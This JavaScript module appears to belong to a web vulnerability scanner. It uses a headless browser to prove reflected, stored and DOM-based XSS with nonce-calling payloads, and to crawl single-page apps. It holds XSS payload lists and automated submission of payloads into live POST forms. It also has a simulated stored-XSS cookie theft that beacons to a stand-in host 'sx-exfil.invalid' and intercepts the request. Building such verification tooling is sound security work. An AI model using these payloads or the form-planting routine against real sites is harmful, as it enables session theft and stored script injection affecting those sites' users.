#!/usr/bin/env node
/**
 * OPTIONAL headless (Playwright) crawl for JS-heavy SPAs — renders each page, follows in-scope
 * links from the rendered DOM, reads forms, and captures XHR/fetch endpoints from live network
 * traffic. Returns the SAME surface shape as crawler.mjs ({origin, pages, paramNames, forms,
 * apiPaths}). Strictly opt-in.
 *
 * Fail-safe by design: if `playwright` isn't installed OR a browser can't launch, it returns null
 * so the caller falls back to the pure-HTTP crawler. (Unverified in environments without browser
 * binaries — it activates only where Playwright + a Chromium build are present, e.g. the worker
 * image. The default scan path does NOT use this.)
 */

/**
 * EXECUTION-PROOF for reflected XSS. Reflection ≠ execution, so the HTTP probe only flags a
 * "potential" candidate. Here we render each candidate in a real browser with a payload that — IF
 * it executes — calls a uniquely-named hook with a high-entropy nonce (or fires a dialog). The
 * nonce cannot appear by chance, so a callback is undeniable proof the injected JS actually RAN in
 * the page (the literal definition of XSS), not merely that our marker was echoed.
 *
 * A strict CSP or proper output-encoding makes the payload NOT run → no callback → correctly not
 * proven (no false positive). Returns the subset of candidates that executed (each with the exact
 * payload + URL used), or null if Playwright/Chromium is unavailable (caller keeps the honest
 * "potential" reflection finding).
 */
export async function proveXss({ targets = [], headers = {}, nonce = 'sxx', timeoutMs = 9000 } = {}) {
  let chromium;
  try {
    ({ chromium } = await import('playwright'));
  } catch {
    return null; // not installed → caller keeps the reflection-only "potential" finding
  }
  let browser;
  try {
    browser = await chromium.launch({ headless: true });
  } catch {
    return null; // no browser binary → fall back to reflection-only
  }

  const N = String(nonce);
  const call = `window.__sxss&&window.__sxss('${N}')`;
  // Variants cover the common reflected-XSS contexts: raw HTML body, attribute/tag breakout, and
  // <title>/<script> contexts. A reflected <script> in server-rendered HTML executes on load;
  // img/svg handlers fire even when inserted as attributes.
  const PAYLOADS = [
    `<img src=x onerror="${call}">`,
    `"><img src=x onerror="${call}">`,
    `'><img src=x onerror="${call}">`,
    `<svg onload="${call}">`,
    `"><svg onload="${call}">`,
    `<script>${call}</script>`,
    `"><script>${call}</script>`,
    `</title><script>${call}</script>`,
  ];
  // Inject the payload into every query param (or add ?q= when there are none) — mirrors the
  // engine's query-injection so we hit the same reflected sink the HTTP probe found.
  const inject = (raw, payload) => {
    try {
      const u = new URL(raw);
      const keys = [...u.searchParams.keys()];
      if (keys.length) for (const k of keys) u.searchParams.set(k, payload);
      else u.searchParams.set('q', payload);
      return u.toString();
    } catch {
      return null;
    }
  };

  const proven = [];
  try {
    const lower = {};
    for (const [k, v] of Object.entries(headers || {})) lower[k.toLowerCase()] = v;
    for (const target of targets) {
      const base = typeof target === 'string' ? target : target?.url;
      if (!base) continue;
      let origin;
      try {
        origin = new URL(base).origin;
      } catch {
        continue;
      }
      const sameOrigin = (u) => {
        try {
          return new URL(u).origin === origin;
        } catch {
          return false;
        }
      };
      const ctx = await browser.newContext({ ignoreHTTPSErrors: true });
      if (Object.keys(lower).length)
        await ctx.route('**/*', (route) => {
          try {
            if (sameOrigin(route.request().url()))
              return route.continue({ headers: { ...route.request().headers(), ...lower } });
          } catch {}
          return route.continue();
        });
      const fired = new Set();
      const page = await ctx.newPage();
      // The injected JS calls this exposed hook; a matching nonce proves real execution.
      await page.exposeFunction('__sxss', (n) => fired.add(String(n))).catch(() => {});
      page.on('dialog', async (d) => {
        fired.add(String(d.message()));
        try {
          await d.dismiss();
        } catch {}
      });
      page.on('pageerror', () => {}); // ignore page JS errors
      let hit = null;
      for (const payload of PAYLOADS) {
        const u = inject(base, payload);
        if (!u) continue;
        fired.clear();
        try {
          await page.goto(u, { waitUntil: 'load', timeout: timeoutMs });
          await page.waitForTimeout(250); // let onerror/onload/dialog handlers run
        } catch {}
        if ([...fired].some((x) => x.includes(N))) {
          hit = { target: base, url: u, payload };
          break;
        }
      }
      await ctx.close().catch(() => {});
      if (hit) proven.push(hit);
    }
    return proven;
  } catch {
    return proven.length ? proven : null;
  } finally {
    await browser.close().catch(() => {});
  }
}

// Parse hidden/CSRF inputs from a form page for a valid submission.
async function hiddenInputs(url, headers) {
  const out = {};
  try {
    const body = await (await fetch(url, { headers })).text();
    for (const inp of body.matchAll(/<input\b[^>]*>/gi)) {
      const t = inp[0];
      const name = (t.match(/\bname\s*=\s*["']?([^"'\s>]+)/i) || [])[1];
      if (!name) continue;
      const type = (t.match(/\btype\s*=\s*["']?([^"'\s>]+)/i) || [])[1] || 'text';
      const vm = t.match(/\bvalue\s*=\s*"([^"]*)"/i) || t.match(/\bvalue\s*=\s*'([^']*)'/i);
      if (/hidden/i.test(type) || /csrf|token|authenticity|_token|xsrf/i.test(name)) out[name] = vm ? vm[1] : '';
    }
  } catch {}
  return out;
}

/**
 * STORED (persistent) XSS execution-proof. Submit a UNIQUE-nonce execution payload into each text
 * field of each POST form, then render candidate pages in a real browser. If a page fires one of the
 * nonces, the stored payload EXECUTED there (on a possibly different page than where it was injected)
 * — the defining property of stored XSS. Zero-FP: the nonce can't appear by chance. Returns
 * [{formUrl, field, page}] or null if Playwright is unavailable.
 */
export async function proveStoredXss({
  origin,
  forms = [],
  pages = [],
  headers = {},
  nonce = 'sxs',
  timeoutMs = 9000,
} = {}) {
  let chromium;
  try {
    ({ chromium } = await import('playwright'));
  } catch {
    return null;
  }
  let browser;
  try {
    browser = await chromium.launch({ headless: true });
  } catch {
    return null;
  }
  const N = String(nonce);
  const mk = (tag) => `<img src=x onerror="window.__sxss&&window.__sxss('${tag}')">`;
  const lower = {};
  for (const [k, v] of Object.entries(headers || {})) lower[k.toLowerCase()] = v;
  const orig = (() => {
    try {
      return new URL(origin).origin;
    } catch {
      return null;
    }
  })();
  try {
    // 1) Submit a distinct payload into each non-secret text field of each POST form.
    const tagMap = new Map(); // nonce-tag → {formUrl, field}
    let i = 0;
    for (const form of forms) {
      if (!form?.url || (form.method || 'post').toLowerCase() !== 'post' || !Array.isArray(form.params)) continue;
      const fields = form.params.filter((p) => !/csrf|token|authenticity|_token|xsrf|state|nonce|pass|pwd/i.test(p));
      if (!fields.length) continue;
      const hidden = await hiddenInputs(form.url, headers);
      for (const field of fields) {
        const tag = `${N}${i++}`;
        tagMap.set(tag, { formUrl: form.url, field });
        const bodyObj = { ...hidden };
        for (const p of form.params) bodyObj[p] = p === field ? mk(tag) : `sx${p}`;
        try {
          await fetch(form.url, {
            method: 'POST',
            headers: { ...headers, 'content-type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams(bodyObj).toString(),
          });
        } catch {}
      }
    }
    if (!tagMap.size) return [];

    // 2) Render candidate pages; a fired nonce = the stored payload executed on that page.
    const proven = [];
    const seen = new Set();
    const pageList = [...new Set([...pages, ...forms.map((f) => f?.url).filter(Boolean), `${orig}/`])].slice(0, 25);
    const ctx = await browser.newContext({ ignoreHTTPSErrors: true });
    if (Object.keys(lower).length)
      await ctx.route('**/*', (route) => {
        try {
          if (new URL(route.request().url()).origin === orig)
            return route.continue({ headers: { ...route.request().headers(), ...lower } });
        } catch {}
        return route.continue();
      });
    const fired = new Set();
    const page = await ctx.newPage();
    await page.exposeFunction('__sxss', (n) => fired.add(String(n))).catch(() => {});
    page.on('dialog', async (d) => {
      fired.add(String(d.message()));
      try {
        await d.dismiss();
      } catch {}
    });
    page.on('pageerror', () => {});
    for (const pg of pageList) {
      fired.clear();
      try {
        await page.goto(pg, { waitUntil: 'load', timeout: timeoutMs });
        await page.waitForTimeout(250);
      } catch {}
      for (const tag of fired) {
        if (tagMap.has(tag) && !seen.has(tag)) {
          seen.add(tag);
          proven.push({ ...tagMap.get(tag), page: pg });
        }
      }
    }
    await ctx.close().catch(() => {});
    return proven;
  } catch {
    return [];
  } finally {
    await browser.close().catch(() => {});
  }
}

/**
 * Stored-XSS → SESSION-THEFT proof (headless-assisted). As the ATTACKER, plant a cookie-exfil payload
 * into each text field of each POST form. Then render candidate pages AS THE VICTIM, with the victim's
 * real session cookies set on the browser context (so document.cookie can read them — unless HttpOnly).
 * If the stored payload executes in the victim's page it beacons document.cookie to the sentinel OOB
 * host; we INTERCEPT that outbound request (and abort it, so nothing actually leaves) and return its URL.
 * The engine's zero-FP core (confirmSessionTheft) then confirms theft only if the beacon carried the
 * victim's OWN session token. Returns the intercepted beacon URLs, or null if Playwright is unavailable.
 */
export async function proveXssExfil({
  origin,
  forms = [],
  pages = [],
  attackerHeaders = {},
  victimCookies = [],
  payload,
  oobHost = 'sx-exfil.invalid',
  timeoutMs = 9000,
} = {}) {
  if (!payload || !victimCookies.length) return [];
  let chromium;
  try {
    ({ chromium } = await import('playwright'));
  } catch {
    return null;
  }
  let browser;
  try {
    browser = await chromium.launch({ headless: true });
  } catch {
    return null;
  }
  const orig = (() => {
    try {
      return new URL(origin).origin;
    } catch {
      return null;
    }
  })();
  try {
    // 1) ATTACKER plants the exfil payload into each non-secret text field of each POST form.
    let planted = 0;
    for (const form of forms) {
      if (!form?.url || (form.method || 'post').toLowerCase() !== 'post' || !Array.isArray(form.params)) continue;
      const fields = form.params.filter((p) => !/csrf|token|authenticity|_token|xsrf|state|nonce|pass|pwd/i.test(p));
      if (!fields.length) continue;
      const hidden = await hiddenInputs(form.url, attackerHeaders);
      const bodyObj = { ...hidden };
      for (const p of form.params) bodyObj[p] = fields.includes(p) ? payload : `sx${p}`;
      try {
        await fetch(form.url, {
          method: 'POST',
          headers: { ...attackerHeaders, 'content-type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams(bodyObj).toString(),
        });
        planted++;
      } catch {}
    }
    if (!planted) return [];

    // 2) VICTIM renders candidate pages with their real session cookies; intercept the beacon.
    const observations = [];
    const ctx = await browser.newContext({ ignoreHTTPSErrors: true });
    try {
      await ctx.addCookies(victimCookies);
    } catch {}
    await ctx.route('**/*', (route) => {
      let host = '';
      try {
        host = new URL(route.request().url()).hostname;
      } catch {}
      if (host === oobHost) {
        observations.push(route.request().url()); // captured the exfil beacon
        return route.abort(); // never actually let it leave the browser
      }
      return route.continue();
    });
    const page = await ctx.newPage();
    page.on('pageerror', () => {});
    const pageList = [...new Set([...pages, ...forms.map((f) => f?.url).filter(Boolean), `${orig}/`])].slice(0, 25);
    for (const pg of pageList) {
      try {
        await page.goto(pg, { waitUntil: 'load', timeout: timeoutMs });
        await page.waitForTimeout(250);
      } catch {}
    }
    await ctx.close().catch(() => {});
    return observations;
  } catch {
    return [];
  } finally {
    await browser.close().catch(() => {});
  }
}

/**
 * DOM-based XSS execution-proof. Inject an execution payload into the URL FRAGMENT (which the server
 * never sees) and the query, render in a real browser, and confirm a nonce callback. To attribute it
 * to a CLIENT-SIDE sink (true DOM XSS) and not double-report server-reflected XSS, a hit only counts
 * when the payload is ABSENT from the raw server response but still EXECUTED in the browser.
 * Returns [{target, url, kind}] or null if Playwright is unavailable.
 */
export async function proveDomXss({ targets = [], headers = {}, nonce = 'sxd', timeoutMs = 9000 } = {}) {
  let chromium;
  try {
    ({ chromium } = await import('playwright'));
  } catch {
    return null;
  }
  let browser;
  try {
    browser = await chromium.launch({ headless: true });
  } catch {
    return null;
  }
  const N = String(nonce);
  const call = `window.__sxss&&window.__sxss('${N}')`;
  const PAYLOADS = [`<img src=x onerror="${call}">`, `<svg onload="${call}">`];
  const lower = {};
  for (const [k, v] of Object.entries(headers || {})) lower[k.toLowerCase()] = v;
  const queryInject = (raw, payload) => {
    try {
      const u = new URL(raw);
      const keys = [...u.searchParams.keys()];
      if (keys.length) for (const k of keys) u.searchParams.set(k, payload);
      else u.searchParams.set('q', payload);
      return u.toString();
    } catch {
      return null;
    }
  };
  const proven = [];
  try {
    for (const target of targets) {
      const base = (typeof target === 'string' ? target : target?.url)?.split('#')[0];
      if (!base) continue;
      let origin;
      try {
        origin = new URL(base).origin;
      } catch {
        continue;
      }
      const ctx = await browser.newContext({ ignoreHTTPSErrors: true });
      if (Object.keys(lower).length)
        await ctx.route('**/*', (route) => {
          try {
            if (new URL(route.request().url()).origin === origin)
              return route.continue({ headers: { ...route.request().headers(), ...lower } });
          } catch {}
          return route.continue();
        });
      const fired = new Set();
      const page = await ctx.newPage();
      await page.exposeFunction('__sxss', (n) => fired.add(String(n))).catch(() => {});
      page.on('dialog', async (d) => {
        fired.add(String(d.message()));
        try {
          await d.dismiss();
        } catch {}
      });
      page.on('pageerror', () => {});
      let hit = null;
      for (const payload of PAYLOADS) {
        const candidates = [`${base}#${payload}`, queryInject(base, payload)].filter(Boolean);
        for (const u of candidates) {
          fired.clear();
          try {
            await page.goto(u, { waitUntil: 'load', timeout: timeoutMs });
            await page.waitForTimeout(200);
            await page.evaluate(() => window.dispatchEvent(new HashChangeEvent('hashchange'))).catch(() => {});
            await page.waitForTimeout(150);
          } catch {}
          if (![...fired].some((x) => x.includes(N))) continue;
          // Executed. Confirm it's CLIENT-SIDE (payload not echoed by the server) → true DOM XSS.
          let raw = '';
          try {
            raw = await (await fetch(u, { headers })).text();
          } catch {}
          if (!raw.includes(N)) {
            hit = { target: base, url: u, kind: u.includes('#') ? 'fragment' : 'query' };
            break;
          }
        }
        if (hit) break;
      }
      await ctx.close().catch(() => {});
      if (hit) proven.push(hit);
    }
    return proven;
  } catch {
    return proven.length ? proven : null;
  } finally {
    await browser.close().catch(() => {});
  }
}

export async function crawlHeadless({ target, maxPages = 30, headers = {}, timeoutMs = 15000 } = {}) {
  let chromium;
  try {
    ({ chromium } = await import('playwright'));
  } catch {
    return null; // playwright not installed → caller falls back to HTTP crawl
  }
  let browser;
  try {
    browser = await chromium.launch({ headless: true });
  } catch {
    return null; // no browser binary → fall back
  }
  try {
    const origin = new URL(target).origin;
    const sameOrigin = (u) => {
      try {
        return new URL(u).origin === origin;
      } catch {
        return false;
      }
    };
    const ctx = await browser.newContext({ ignoreHTTPSErrors: true });
    // SECURITY: attach the auth/session headers ONLY to same-origin requests — off-origin
    // subresources (CDNs, analytics) and any off-origin redirect must NOT receive credentials.
    if (headers && Object.keys(headers).length) {
      const lower = {};
      for (const [k, v] of Object.entries(headers)) lower[k.toLowerCase()] = v;
      await ctx.route('**/*', (route) => {
        try {
          if (sameOrigin(route.request().url()))
            return route.continue({ headers: { ...route.request().headers(), ...lower } });
        } catch {}
        return route.continue();
      });
    }
    const seen = new Set();
    const queued = new Set([target]);
    const queue = [target];
    const pages = [];
    const paramNames = new Set();
    const forms = [];
    const apiPaths = new Set();

    const enqueue = (u) => {
      const c = (u || '').split('#')[0];
      if (c && sameOrigin(c) && !queued.has(c) && queued.size < maxPages * 20) {
        queued.add(c);
        queue.push(c);
      }
    };

    while (queue.length && pages.length < maxPages) {
      const url = queue.shift();
      if (seen.has(url) || !sameOrigin(url)) continue;
      seen.add(url);
      const page = await ctx.newPage();
      const reqs = [];
      page.on('request', (r) => {
        try {
          if (sameOrigin(r.url())) reqs.push(r.url());
        } catch {}
      });
      let status = 0;
      try {
        const resp = await page.goto(url, { waitUntil: 'networkidle', timeout: timeoutMs });
        status = resp ? resp.status() : 0;
      } catch {
        await page.close().catch(() => {});
        continue;
      }
      pages.push({ url, status });
      for (const k of new URL(url).searchParams.keys()) paramNames.add(k);
      const hrefs = await page.$$eval('a[href]', (as) => as.map((a) => a.href)).catch(() => []);
      for (const h of hrefs) {
        enqueue(h);
        try {
          for (const k of new URL(h).searchParams.keys()) paramNames.add(k);
        } catch {}
      }
      const fdata = await page
        .$$eval('form', (fs) =>
          fs.map((f) => ({
            action: f.action || location.href,
            method: (f.method || 'get').toLowerCase(),
            params: [...f.querySelectorAll('[name]')].map((e) => e.name).filter(Boolean),
          })),
        )
        .catch(() => []);
      for (const f of fdata) {
        forms.push({ url: f.action, method: f.method, params: f.params, csrf: null });
        for (const p of f.params) paramNames.add(p);
      }
      for (const ru of reqs) {
        try {
          const pu = new URL(ru);
          if (/\/(api|v\d|graphql|rest|auth|user|account|admin)/i.test(pu.pathname)) apiPaths.add(pu.pathname);
          if (pu.search) {
            for (const k of pu.searchParams.keys()) paramNames.add(k);
            enqueue(ru);
          }
        } catch {}
      }
      await page.close().catch(() => {});
    }
    await browser.close().catch(() => {});
    // A near-empty headless result (e.g. an apex->www redirect the renderer didn't descend) is worse
    // than the HTTP crawler — return null so the caller falls back to it.
    if (!pages.length) return null;
    return { origin, pages, paramNames: [...paramNames], forms, apiPaths: [...apiPaths], headless: true };
  } catch {
    try {
      await browser.close();
    } catch {}
    return null;
  }
}
